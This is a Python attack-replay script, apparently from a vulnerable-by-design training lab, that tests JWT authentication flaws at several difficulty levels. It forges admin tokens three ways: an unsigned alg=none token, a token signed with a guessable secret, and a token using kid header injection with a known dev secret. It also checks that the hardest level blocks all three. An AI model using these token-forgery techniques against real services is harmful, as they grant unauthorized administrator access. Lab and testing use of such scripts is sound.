#!/usr/bin/env python3
"""Replay the jwt-flaws scenario against a running HoneyScope instance.

Usage:
    python attack.py http://localhost:5000 [low|medium|high|impossible]

Only run against instances you own or have explicit permission to test.
Standard library only — no external dependencies.
"""
import base64
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request


# ---------------------------------------------------------------------------
# Minimal pure-stdlib JWT helpers (no PyJWT dependency in attack.py)
# ---------------------------------------------------------------------------

def _b64url_encode(data: str | bytes) -> str:
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    pad = 4 - len(s) % 4
    if pad != 4:
        s += "=" * pad
    return base64.urlsafe_b64decode(s)


def _make_none_token(sub: str, role: str) -> str:
    """Craft an alg=none JWT (no signature)."""
    header = _b64url_encode('{"alg":"none","typ":"JWT"}')
    payload = _b64url_encode(json.dumps({"sub": sub, "role": role}))
    return f"{header}.{payload}."


def _make_hs256_token(sub: str, role: str, secret: str, extra_headers: dict | None = None) -> str:
    """Sign a JWT with HMAC-SHA256 (pure stdlib)."""
    import hashlib
    import hmac

    header_dict = {"alg": "HS256", "typ": "JWT"}
    if extra_headers:
        header_dict.update(extra_headers)
    header = _b64url_encode(json.dumps(header_dict, separators=(",", ":")))
    payload = _b64url_encode(json.dumps({"sub": sub, "role": role}, separators=(",", ":")))
    signing_input = f"{header}.{payload}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{header}.{payload}.{_b64url_encode(sig)}"


# ---------------------------------------------------------------------------
# HTTP helpers
# ---------------------------------------------------------------------------

def _post_form(base_url: str, path: str, data: dict) -> tuple[int, dict | str]:
    url = base_url.rstrip("/") + path
    payload = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(
        url, data=payload, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        with urllib.request.urlopen(req) as r:
            body = r.read().decode()
            try:
                return r.status, json.loads(body)
            except Exception:
                return r.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode()
        try:
            return e.code, json.loads(body)
        except Exception:
            return e.code, body


def _get_profile(base_url: str, token: str) -> tuple[int, dict | str]:
    url = base_url.rstrip("/") + "/api/auth/profile"
    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        return e.code, {}


# ---------------------------------------------------------------------------
# Level-specific attacks
# ---------------------------------------------------------------------------

def _attack_low(base_url: str) -> bool:
    """Forge an alg=none token with role=admin."""
    token = _make_none_token("alice", "admin")
    status, data = _get_profile(base_url, token)
    print(f"  GET /api/auth/profile → HTTP {status}")
    if status == 200 and isinstance(data, dict):
        role = data.get("claims", {}).get("role", "")
        if role == "admin":
            print(f"  ✓ Forged token accepted — role={role}")
            if "flag" in data:
                print(f"  🚩 Flag: {data['flag']}")
            return True
    print("  ✗ Forgery failed.")
    return False


def _attack_medium(base_url: str) -> bool:
    """Crack the weak secret and forge an HS256 token."""
    cracked_secret = "secret"   # pre-cracked for the demo
    token = _make_hs256_token("alice", "admin", cracked_secret)
    status, data = _get_profile(base_url, token)
    print(f"  GET /api/auth/profile (forged with secret={cracked_secret!r}) → HTTP {status}")
    if status == 200 and isinstance(data, dict):
        role = data.get("claims", {}).get("role", "")
        if role == "admin":
            print(f"  ✓ Forged token accepted — role={role}")
            if "flag" in data:
                print(f"  🚩 Flag: {data['flag']}")
            return True
    print("  ✗ Forgery failed.")
    return False


def _attack_high(base_url: str) -> bool:
    """Inject kid=dev to use the known weak dev-secret."""
    dev_secret = "dev-secret"
    token = _make_hs256_token("alice", "admin", dev_secret, extra_headers={"kid": "dev"})
    status, data = _get_profile(base_url, token)
    print(f"  GET /api/auth/profile (kid=dev, secret={dev_secret!r}) → HTTP {status}")
    if status == 200 and isinstance(data, dict):
        role = data.get("claims", {}).get("role", "")
        if role == "admin":
            print(f"  ✓ kid injection accepted — role={role}")
            if "flag" in data:
                print(f"  🚩 Flag: {data['flag']}")
            return True
    print("  ✗ kid injection failed.")
    return False


def _attack_impossible(base_url: str) -> bool:
    """All bypasses should fail at impossible."""
    for name, token in [
        ("alg=none",    _make_none_token("alice", "admin")),
        ("weak secret", _make_hs256_token("alice", "admin", "secret")),
        ("kid=dev",     _make_hs256_token("alice", "admin", "dev-secret", {"kid": "dev"})),
    ]:
        status, _ = _get_profile(base_url, token)
        print(f"  {name}: HTTP {status} {'✓ blocked' if status == 403 else '✗ ACCEPTED (bug!)'}")
    return False   # impossible is not expected to succeed


# ---------------------------------------------------------------------------
# Entry-point
# ---------------------------------------------------------------------------

DISPATCHERS = {
    "low": _attack_low,
    "medium": _attack_medium,
    "high": _attack_high,
    "impossible": _attack_impossible,
}


def attack(base_url: str, level: str) -> bool:
    fn = DISPATCHERS.get(level)
    if fn is None:
        raise ValueError(f"Unknown level: {level!r}")
    return fn(base_url)


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    lvl  = sys.argv[2] if len(sys.argv) > 2 else "low"
    print(f"[jwt-flaws] Attacking {base} at level={lvl}")
    ok = attack(base, lvl)
    print(f"[{lvl}] {'SUCCEEDED' if ok else 'FAILED'}")
    sys.exit(0 if ok else 1)
